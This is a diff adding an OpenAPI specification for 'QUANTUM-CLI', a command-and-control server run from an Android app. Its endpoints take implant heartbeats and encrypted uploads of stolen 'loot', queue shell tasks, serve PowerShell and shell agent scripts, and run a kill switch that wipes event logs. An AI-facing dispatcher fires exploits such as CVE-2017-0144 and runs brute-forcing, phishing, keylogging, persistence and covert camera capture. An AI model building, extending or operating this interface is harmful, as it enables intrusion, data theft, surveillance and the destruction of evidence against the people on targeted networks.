@@ -1,0 +1,275 @@
+openapi: 3.0.3
+info:
+  title: QUANTUM-CLI Embedded C2 API (Android)
+  version: 3.1.0
+  description: |
+    REST surface of the NanoHTTPD C2 server embedded in the QUANTUM-CLI Android
+    app (`c2/C2Server.kt`), 1:1 with the Python script's endpoints. Served on the
+    device at `http://<device-ip>:<c2Port>` (default port 8443). All responses
+    carry permissive CORS headers. Authorized security engagements only.
+servers:
+  - url: http://localhost:8443
+    description: ADB-forwarded device server (adb forward tcp:8443 tcp:8443)
+  - url: http://{deviceIp}:8443
+    description: LAN device server
+    variables:
+      deviceIp:
+        default: 192.168.1.10
+tags:
+  - name: dashboard
+  - name: implants
+  - name: control
+  - name: agents
+  - name: ai
+paths:
+  /:
+    get:
+      tags: [dashboard]
+      operationId: getIndex
+      summary: Service index
+      responses:
+        '200':
+          description: Version, dashboard location and endpoint list
+          content:
+            application/json:
+              schema:
+                type: object
+                required: [ok, version, dashboard, endpoints]
+                properties:
+                  ok:
+                    type: boolean
+                    example: true
+                  version:
+                    type: string
+                    example: 3.1.0
+                  dashboard:
+                    type: string
+                    example: /dash
+                  endpoints:
+                    type: array
+                    items: { type: string }
+                    example: ["/dash", "/dash/api/state", "/r", "/kill", "/s/<profile>", "/ai"]
+  /dash:
+    get:
+      tags: [dashboard]
+      operationId: getDashboardHtml
+      summary: QUANTUMDASH browser dashboard
+      responses:
+        '200':
+          description: Static dashboard HTML (polls /dash/api/state every 3s)
+          content:
+            text/html:
+              schema: { type: string }
+  /dash/api/state:
+    get:
+      tags: [dashboard]
+      operationId: getDashState
+      summary: Live C2 state (decisions, audit, MITRE coverage, implants)
+      responses:
+        '200':
+          description: Current dash state snapshot
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/DashState'
+  /r:
+    post:
+      tags: [implants]
+      operationId: postBeacon
+      summary: Implant beacon (heartbeat, posix drop, or encrypted drop)
+      description: |
+        One endpoint, three payload shapes selected by body fields:
+        1. Heartbeat — `act: "hb"`; enrolls the host and returns any queued task.
+        2. Posix drop — non-blank `data` with blank `k`; body is base64, stored
+           and sealed as loot, returns any queued task.
+        3. Encrypted drop — RSA-OAEP-wrapped AES envelope in `k`; decrypted,
+           stored as a zip and sealed as loot; decrypt failure replies `none`.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              oneOf:
+                - $ref: '#/components/schemas/Heartbeat'
+                - $ref: '#/components/schemas/PosixDrop'
+                - $ref: '#/components/schemas/EncryptedDrop'
+      responses:
+        '200':
+          description: Queued task for the host (or act=none)
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/TaskReply'
+  /kill:
+    post:
+      tags: [control]
+      operationId: postKill
+      summary: Arm or disarm the kill switch
+      requestBody:
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/KillRequest'
+      responses:
+        '200':
+          description: Wipe/die task hosts, or disarm note
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/KillResult'
+  /s/{profile}:
+    get:
+      tags: [agents]
+      operationId: getAgentProfile
+      summary: Serve an agent script (OBSIDIAN ps1 / GHOSTFANG sh)
+      parameters:
+        - name: profile
+          in: path
+          required: true
+          schema: { type: string }
+          example: default
+      responses:
+        '200':
+          description: Agent script text with embedded C2 host
+          content:
+            text/plain:
+              schema: { type: string }
+        '404':
+          description: Unknown profile
+          content:
+            text/plain:
+              schema: { type: string, example: unknown profile }
+  /ai:
+    post:
+      tags: [ai]
+      operationId: postAiCommand
+      summary: QCLI_API command dispatcher
+      description: |
+        Dispatches a named command with a params object. Commands (parity with
+        the Python QCLI_API): status, zerocheck, fire, scan, fingerprint,
+        brute, rtspbrute, roast, phish, camwar/camdiscover, mitre, decide,
+        plan, kill, flashfill, emojisms, macreset, mshtmaldoc, kitlogger,
+        persistx, footprint, camshot. Unknown commands return an error object.
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: '#/components/schemas/AiRequest'
+            examples:
+              status:
+                value: { cmd: status }
+              scan:
+                value: { cmd: scan, params: { cidr: 192.168.1.0/24 } }
+              fire:
+                value: { cmd: fire, params: { cve: CVE-2017-0144, ip: 192.168.1.50 } }
+      responses:
+        '200':
+          description: Command result (shape depends on cmd; errors return {error})
+          content:
+            application/json:
+              schema:
+                $ref: '#/components/schemas/AiResult'
+components:
+  schemas:
+    DashState:
+      type: object
+      required: [decisions, audit, mitre, killswitch, implants, version]
+      properties:
+        decisions:
+          type: array
+          maxItems: 100
+          items: { $ref: '#/components/schemas/Decision' }
+        audit:
+          type: array
+          maxItems: 200
+          items: { $ref: '#/components/schemas/AuditEvent' }
+        mitre:
+          type: array
+          items: { type: string }
+          example: ["T1110", "T1203"]
+        killswitch:
+          type: boolean
+        implants:
+          type: object
+          additionalProperties:
+            type: object
+            required: [last_seen, beacons]
+            properties:
+              last_seen: { type: string, example: '2026-09-28T14:03:11' }
+              beacons: { type: integer, example: 42 }
+        version: { type: string, example: 3.1.0 }
+    Decision:
+      type: object
+      required: [ts, action, target, reason]
+      properties:
+        ts: { type: string }
+        action: { type: string, example: cam_war }
+        target: { type: string, example: 192.168.1.50 }
+        reason: { type: string }
+    AuditEvent:
+      type: object
+      required: [ts, tag, msg]
+      properties:
+        ts: { type: string }
+        tag: { type: string, example: CAM, enum: [C2, CAM, ATK, RECON, OPSEC, AI, LOOT, ERR, OK, UI] }
+        msg: { type: string }
+    Heartbeat:
+      type: object
+      required: [host, act]
+      properties:
+        host: { type: string, example: LAB-PC-01 }
+        act: { type: string, enum: [hb] }
+        os: { type: string, example: Windows 11 x64 }
+    PosixDrop:
+      type: object
+      required: [host, data]
+      properties:
+        host: { type: string }
+        data:
+          type: string
+          description: Base64 payload; must be present while k is blank
+    EncryptedDrop:
+      type: object
+      required: [host, k]
+      properties:
+        host: { type: string }
+        k:
+          type: string
+          description: RSA-OAEP-wrapped AES + gzip envelope (BeaconCrypto)
+    TaskReply:
+      type: object
+      required: [act]
+      properties:
+        act: { type: string, example: run }
+        cmd: { type: string, example: whoami }
+    KillRequest:
+      type: object
+      properties:
+        arm: { type: boolean, default: true }
+        wipe: { type: boolean, default: true, description: Queue event-log/temp wipe task before die }
+    KillResult:
+      type: object
+      required: [killed]
+      properties:
+        killed:
+          type: array
+          items: { type: string }
+          description: Hosts that received wipe/die tasks
+        note: { type: string, example: kill-switch disarmed }
+    AiRequest:
+      type: object
+      required: [cmd]
+      properties:
+        cmd: { type: string, example: scan }
+        params:
+          type: object
+          additionalProperties: true
+          description: Command-specific parameters (ip, cidr, cve, host, port, …)
+    AiResult:
+      type: object
+      additionalProperties: true
+      description: |
+        Command-specific JSON result. Error shape:
+        { "error": "message" } (bad params, unknown command, runtime failure).
+  securitySchemes: {}
